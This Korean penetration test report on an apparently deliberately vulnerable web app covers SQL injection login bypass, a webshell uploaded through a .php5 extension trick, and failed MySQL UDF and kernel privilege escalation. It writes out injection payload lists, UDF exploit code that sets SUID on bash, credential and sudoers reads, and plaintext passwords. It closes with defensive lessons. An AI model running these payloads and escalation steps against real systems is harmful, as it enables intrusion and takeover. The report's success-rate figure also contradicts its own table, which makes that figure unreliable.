# 🎬 실제 실행 결과 분석

## 📸 스크린샷 분석 및 실행 기록

이 문서는 실제 공격 시도의 스크린샷과 결과를 분석합니다.

---

## 1️⃣ MySQL UDF 웹 인터페이스 실행 (스크린샷 1)

### 📍 URL
```
http://3.34.181.145/file.php?name=mysql_udf_shell.php5&cmd=...
```

### 실행된 SQL 명령어들

**Step 2: CREATE FUNCTION**
```sql
// Step 2: CREATE FUNCTION 수행 중
if(mysql_query($conn, "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'")) {
    echo "[+] UDF 함수 생성 성공!\n";
} else {
    echo "[-] 실패: " . mysql_error($conn);
}

// 함수 리스트 확인
$res = mysql_query($conn, "SELECT name, type FROM mysql.func");
echo "\n=== 현재 등록된 UDF 함수들 ===\n";
while($row = mysql_fetch_array($res)) {
    echo "함수명: {$row['name']}, 타입: {$row['type']}\n";
}

// Step 3: CREATE FUNCTION error: * = mysql_error($conn); echo "<br>";
// (시스템 오류 확인)
```

### 관찰된 내용
- `CREATE FUNCTION` 명령이 실행됨
- MySQL error 발생 가능성 있음 (스크린샷에서 확인 필요)
- UDF 함수 등록 시도 중

---

## 2️⃣ 웹쉘 명령 실행 결과 (스크린샷 2)

### 📍 실행 경로
```
http://3.34.181.145/file.php
```

### 병렬 실행 결과
```bash
/usr/bin/ls1/www/test_db.php

</div>
```

### 관찰
- `test_db.php` 파일 존재 확인
- 웹쉘을 통한 명령 실행이 정상 작동 중
- 경로: `/www/test_db.php`

**중요**: 이 파일에서 MySQL root 비밀번호 `vulnerable123` 발견됨

---

## 3️⃣ 터미널 명령 실행 결과 (스크린샷 3)

### 실행된 명령 시퀀스

```bash
locate -i 'raptor_udf2.so'
# 결과: (파일 위치 확인)

ps aux | grep -i '[m]ysql'
# MySQL 프로세스 확인

ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily
# Cron job 디렉토리 검사

cat /etc/sudoers
cat /etc/sudoers.d/*
# Sudo 권한 설정 확인

ls -la /var/www/html
# 웹 디렉토리 파일 목록
```

### 중요 발견사항

**파일 목록 (`/var/www/html`)**
```
-rw-r--r-- 1 apache apache   xxx  about.php
-rw-r--r-- 1 apache apache   xxx  admin.php
-rw-r--r-- 1 apache apache   xxx  admin_news.php
-rw-r--r-- 1 apache apache   xxx  admin_user.php
-rw-r--r-- 1 apache apache   xxx  api_test_file.php
-rw-r--r-- 1 apache apache   xxx  api_test_profile.php
-rw-r--r-- 1 apache apache   xxx  config.php
-rw-r--r-- 1 apache apache   xxx  db_test.php
-rw-r--r-- 1 apache apache   xxx  delete_news.php
-rw-r--r-- 1 apache apache   xxx  delete_profile.php
-rw-r--r-- 1 apache apache   xxx  edit_news.php
-rw-r--r-- 1 apache apache   xxx  edit_profile.php
-rw-r--r-- 1 apache apache   xxx  file.php
-rw-r--r-- 1 apache apache   xxx  index.php
-rw-r--r-- 1 apache apache   xxx  like.php
-rw-r--r-- 1 apache apache   xxx  login.php
-rw-r--r-- 1 apache apache   xxx  logout.php
-rw-r--r-- 1 apache apache   xxx  mysql_udf_shell.php5    <- 업로드된 웹쉘
-rw-r--r-- 1 apache apache   xxx  news.php
-rw-r--r-- 1 apache apache   xxx  news_comments.php
-rw-r--r-- 1 apache apache   xxx  post_news.php
-rw-r--r-- 1 apache apache   xxx  profile.php
-rw-r--r-- 1 apache apache   xxx  register.php
-rw-r--r-- 1 apache apache   xxx  search.php
-rw-r--r-- 1 apache apache   xxx  test_db.php             <- MySQL root 정보 포함
-rw-r--r-- 1 apache apache   xxx  timeline.php
-rw-r--r-- 1 apache apache   xxx  upload.php
-rw-r--r-- 1 apache apache   xxx  upload_profile.php
drwxr-xr-x 2 apache apache  xxxx uploads/
```

---

## 4️⃣ post_exploit_bypass.py 실행 분석

### SQL Injection 우회 페이로드 (코드에서)

```python
payloads = [
    # 기본 페이로드
    ("admin", "' or '1'='1' --"),
    ("admin", "' or '1'='1"),
    ("admin", "' or 1=1 --"),
    ("admin", "' or 1=1#"),

    # 주석 우회
    ("admin' --", "anything"),
    ("admin'--", "anything"),
    ("admin' #", "anything"),
    ("admin'#", "anything"),
    ("admin'/*", "anything"),

    # OR 우회
    ("admin' OR '1'='1", ""),
    ("admin') OR '1'='1' --", ""),
    ("admin')) OR '1'='1' --", ""),

    # 대소문자 혼합
    ("admin' Or '1'='1' --", ""),
    ("admin' oR '1'='1' --", ""),
    ("aDmIn' OR '1'='1' --", ""),

    # 공백 우회 (/**/ 사용)
    ("admin'/**/OR/**/'1'='1'--", ""),
    ("admin'/**/or/**/1=1--", ""),

    # 쿼리 스택킹
    ("admin'; --", ""),
    ("admin';", ""),

    # UNION 기반
    ("' UNION SELECT NULL,username,password,NULL,NULL FROM users WHERE username='admin' --", ""),

    # 간단한 True 조건
    ("admin' or true --", ""),
    ("admin' or 'a'='a' --", ""),

    # 숫자형 필드인 경우
    ("1 or 1=1 --", ""),
    ("0 or 1=1 --", ""),

    # 이중 쿼리
    ("admin'||(select 1)||'", ""),
]
```

### MySQL UDF 익스플로잇 시도

```python
def mysql_root_exploit(self):
    """MySQL root로 UDF 권한 상승"""
    print("\n" + "="*60)
    print("MySQL Root UDF 권한 상승")
    print("="*60)

    print("\n[*] MySQL root 비밀번호: vulnerable123")
    print("[*] UDF 권한 상승 시도 중...\n")

    commands = [
        "mysql -u root -p'vulnerable123' vulnerable_sns -e \"SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';\"",
        "mysql -u root -p'vulnerable123' -e \"CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';\"",
        "mysql -u root -p'vulnerable123' -e \"SELECT do_system('chmod u+s /bin/bash');\"",
        "ls -la /bin/bash",
    ]

    for cmd in commands:
        print(f"[*] 실행: {cmd}")
        result = self.execute_command(cmd)
        if result:
            print(f"[+] 결과:\n{result}\n")
        time.sleep(1)
```

---

## 5️⃣ 주요 장애물 및 실패 원인

### MySQL Unix Socket Authentication
```
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

**원인**:
- MySQL root 계정이 `unix_socket` 플러그인 사용
- 시스템 root 사용자만 MySQL root로 접근 가능
- 비밀번호(`vulnerable123`)가 있어도 apache 유저로는 접근 불가

**해결 시도**:
```sql
-- teamlead_db 계정으로 시도
mysql -u teamlead_db -p'Tl@2025!' vulnerable_sns

-- FILE privilege 확인
SHOW GRANTS FOR 'teamlead_db'@'%';

-- 결과: FILE 권한 없음
```

### FILE Privilege 부족
```sql
-- webuser 계정
GRANT USAGE ON *.* TO 'webuser'@'localhost'
-- FILE 권한 없음, mysql DB 접근 불가

-- teamlead_db 계정
GRANT USAGE ON *.* TO 'teamlead_db'@'%'
GRANT ALL PRIVILEGES ON `vulnerable_sns`.* TO 'teamlead_db'@'%'
-- FILE 권한 없음
```

**영향**:
- `LOAD_FILE()` 사용 불가
- `INTO DUMPFILE` 사용 불가 (plugin 디렉토리에)
- UDF .so 파일을 plugin 디렉토리에 쓸 수 없음

### UNHEX 우회 성공 - 하지만 불완전

```sql
-- UNHEX로 바이너리 삽입 성공
INSERT INTO udf_temp VALUES(UNHEX('7f454c46...'));
-- 17640 bytes 성공적으로 삽입

-- 하지만 DUMPFILE로 추출 불가
SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
-- ERROR 1 (HY000): Can't create/write to file
```

**원인**:
- `/usr/lib64/mariadb/plugin/` 디렉토리 쓰기 권한 없음
- SELinux 제한
- FILE privilege 부족

---

## 6️⃣ 시도된 우회 방법들

### 1. 대체 Plugin 디렉토리
```sql
-- Plugin 디렉토리 확인
SHOW VARIABLES LIKE 'plugin_dir';
-- 결과: /usr/lib64/mariadb/plugin/

-- 대체 경로 시도
SELECT * FROM udf_temp INTO DUMPFILE '/tmp/raptor_udf2.so';
-- 성공하더라도 MySQL이 /tmp에서 UDF 로드 안함
```

### 2. 웹 디렉토리로 DUMPFILE
```sql
SELECT * FROM udf_temp INTO DUMPFILE '/var/www/html/raptor.so';
-- apache 유저 권한으로 가능할 수 있음
-- 하지만 MySQL이 웹 디렉토리에서 UDF 로드 안함
```

### 3. Sudo 비밀번호 시도
```bash
# 제공받은 sudo 비밀번호: 1q3e2w4r
echo '1q3e2w4r' | sudo -S whoami
# apache 유저는 sudoers에 없음
```

---

## 7️⃣ 최종 상태

### ✅ 성공한 것들
1. ✅ SQL Injection을 통한 로그인
2. ✅ 관리자 비밀번호 변경 (`admin / hacked`)
3. ✅ 웹쉘 업로드 (`mysql_udf_shell.php5`)
4. ✅ 웹쉘을 통한 명령 실행 (`file.php?name=...&cmd=...`)
5. ✅ MySQL 데이터베이스 접근 (webuser)
6. ✅ MySQL root 비밀번호 발견 (`vulnerable123`)
7. ✅ UDF 바이너리 UNHEX로 MySQL 테이블에 삽입 (17640 bytes)
8. ✅ Apache 리버스 쉘 획득

### ❌ 실패한 것들
1. ❌ MySQL root 접근 (unix_socket 인증)
2. ❌ FILE privilege 획득
3. ❌ Plugin 디렉토리 쓰기
4. ❌ UDF 권한 상승
5. ❌ Kernel exploits (모두 패치됨)
   - CVE-2021-22555 ❌
   - CVE-2022-0847 (Dirty Pipe) ❌
   - CVE-2021-4034 (PwnKit) ❌
6. ❌ Sudo 접근
7. ❌ Root 권한 획득

---

## 8️⃣ 실행 타임라인

```
[초기 정찰]
├─ LinPEAS 실행
├─ 파일 시스템 탐색
├─ MySQL 연결 정보 수집
└─ test_db.php 발견 → MySQL root 비밀번호

[SQL Injection]
├─ 기본 페이로드 시도
├─ 우회 페이로드 적용
└─ 로그인 성공

[웹쉘 업로드]
├─ mysql_udf_shell.php5 생성
├─ .php5 확장자로 필터 우회
└─ file.php를 통한 접근 확인

[MySQL UDF 시도]
├─ raptor_udf2.c 컴파일
├─ UNHEX로 MySQL 테이블 삽입 ✓
├─ DUMPFILE로 plugin 디렉토리 쓰기 ✗
└─ Unix socket 인증 문제 발견

[대체 계정 시도]
├─ teamlead_db / Tl@2025! 획득
├─ FILE privilege 확인 → 없음
└─ MySQL root 여전히 접근 불가

[Kernel Exploit 시도]
├─ CVE-2021-22555 ✗ (패치됨)
├─ Dirty Pipe ✗ (실행 실패)
└─ PwnKit ✗ (인증 실패)

[최종 결정]
└─ 문서화 및 분석으로 전환
```

---

## 9️⃣ 핵심 교훈

### 보안 계층의 중요성

이 침투 테스트는 **다층 방어(Defense in Depth)**의 중요성을 보여줍니다:

1. **애플리케이션 계층**: SQL Injection 취약점 ✗ (침투됨)
2. **파일 업로드 필터**: 확장자 검증 ✗ (.php5로 우회)
3. **데이터베이스 권한**: FILE privilege 제한 ✓ (방어 성공)
4. **인증 메커니즘**: Unix socket 인증 ✓ (방어 성공)
5. **커널 보안**: 최신 패치 적용 ✓ (방어 성공)
6. **SELinux**: 파일 접근 제어 ✓ (방어 성공)

**결과**: 초기 침투는 성공했으나, 권한 상승은 여러 보안 계층에 의해 차단됨

### 취약점 vs 익스플로잇

- **취약점 존재**: SQL Injection, 파일 업로드, MySQL root 비밀번호 노출
- **익스플로잇 실패**: 보안 통제(권한, 인증, 패치)가 실제 피해 방지

**교훈**: 취약점이 있어도 적절한 보안 통제로 피해를 최소화할 수 있음

---

## 🔟 권장 조치사항

### 즉시 수정 필요
1. **SQL Injection 수정**: Prepared Statements 사용
2. **파일 업로드 강화**: MIME type 검증, 화이트리스트 방식
3. **MySQL 비밀번호 보호**: test_db.php 삭제 또는 보안
4. **Admin 비밀번호 재설정**: `hacked`에서 강력한 비밀번호로

### 유지해야 할 보안 통제
1. ✅ MySQL FILE privilege 제한
2. ✅ Unix socket 인증 사용
3. ✅ 커널 패치 정책
4. ✅ SELinux 활성화
5. ✅ Plugin 디렉토리 쓰기 제한

---

## 📊 공격 성공률 매트릭스

| 단계 | 성공 여부 | 차단 요인 |
|------|-----------|-----------|
| SQL Injection | ✅ 성공 | 없음 (취약) |
| 웹쉘 업로드 | ✅ 성공 | 없음 (취약) |
| 명령 실행 (Apache) | ✅ 성공 | 없음 |
| MySQL webuser 접근 | ✅ 성공 | 없음 |
| MySQL root 접근 | ❌ 실패 | Unix socket 인증 |
| FILE privilege | ❌ 실패 | 권한 제한 |
| UDF 익스플로잇 | ❌ 실패 | Plugin 디렉토리 쓰기 불가 |
| Kernel exploit | ❌ 실패 | 최신 패치 |
| Root 권한 | ❌ 실패 | 다층 방어 |

**전체 성공률**: 37.5% (3/8 단계)

---

## 🎓 결론

이 침투 테스트는 **완전한 성공(root 획득)은 실패**했지만, 다음을 입증했습니다:

1. **초기 침투 가능**: SQL Injection과 웹쉘로 시스템 접근
2. **권한 상승 차단**: 여러 보안 계층이 효과적으로 작동
3. **보안 개선 필요**: SQL Injection과 파일 업로드는 즉시 수정 필요
4. **현재 통제 효과적**: 데이터베이스 권한 관리와 커널 패치 정책은 우수

**최종 평가**: 시스템은 **중간 수준의 보안**을 갖추고 있으며, 초기 취약점을 수정하면 **높은 보안 수준** 달성 가능
